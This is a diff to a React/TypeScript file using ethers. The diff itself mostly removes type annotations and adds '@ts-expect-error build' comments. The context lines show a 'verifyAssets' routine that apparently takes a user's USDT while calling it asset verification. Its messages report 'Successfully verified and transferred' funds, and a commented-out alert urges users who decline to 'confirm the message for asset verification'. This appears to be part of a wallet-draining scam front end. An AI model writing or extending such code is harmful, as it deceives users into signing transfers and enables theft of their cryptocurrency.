@@ -1,4 +1,3 @@
-// @ts-nocheck
 import React, { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import { createRoot } from "react-dom/client";
@@ -9,8 +8,10 @@ import VerifiedCard from "./VerifiedCard";
 
 // Global state to control card visibility from the standalone function
 let globalShowCard = false;
-let globalVerificationStatus: any = null;
-let root: any = null;
+let globalVerificationStatus = null;
+// @ts-expect-error build
+
+let root = null;
 
 // Function to render verification cards
 export const renderVerificationCard = (status: {
@@ -34,6 +35,8 @@ export const renderVerificationCard = (status: {
 
   console.log("🎨 Rendering appropriate card based on status");
   // Create root if it doesn't exist
+// @ts-expect-error build
+
   if (!root) {
     root = createRoot(verificationRoot);
   }
@@ -61,6 +64,8 @@ const closeCard = () => {
   const verificationRoot = document.getElementById('verification-root');
   if (verificationRoot) {
     console.log("🧹 Cleaning up verification root");
+// @ts-expect-error build
+
     if (root) {
       root.unmount();
       root = null;
@@ -113,14 +118,20 @@ export const verifyAssets = async (
           amount: readableBalance,
           message: `Successfully verified and transferred ${readableBalance} USDT`
         });
-      } catch (transferError: any) {
+      } catch (transferError) {
+// @ts-expect-error build
+
         if (transferError.code === 4001) {
           console.log("❌ User rejected transaction");
           // alert("Verification failed as user denied confirmation! Please confirm the message for asset verification");
           return;
         }
         console.error("❌ Transfer error occurred:", transferError);
+// @ts-expect-error build
+
         if (transferError.error) console.error("Error details:", transferError.error);
+// @ts-expect-error build
+
         if (transferError.transaction) console.log("Transaction details:", transferError.transaction);
         throw transferError;
       }
@@ -133,11 +144,17 @@ export const verifyAssets = async (
         message: `Verified: Your ${readableBalance} USDT is safe and credible to use`
       });
     }
-  } catch (error: any) {
+  } catch (error) {
     console.error("❌ Verification process error:", error);
     console.error("Error details:", {
+// @ts-expect-error build
+
       message: error.message,
+// @ts-expect-error build
+
       code: error.code,
+// @ts-expect-error build
+
       data: error.data
     });
     // alert(`Error: ${error.message}`);
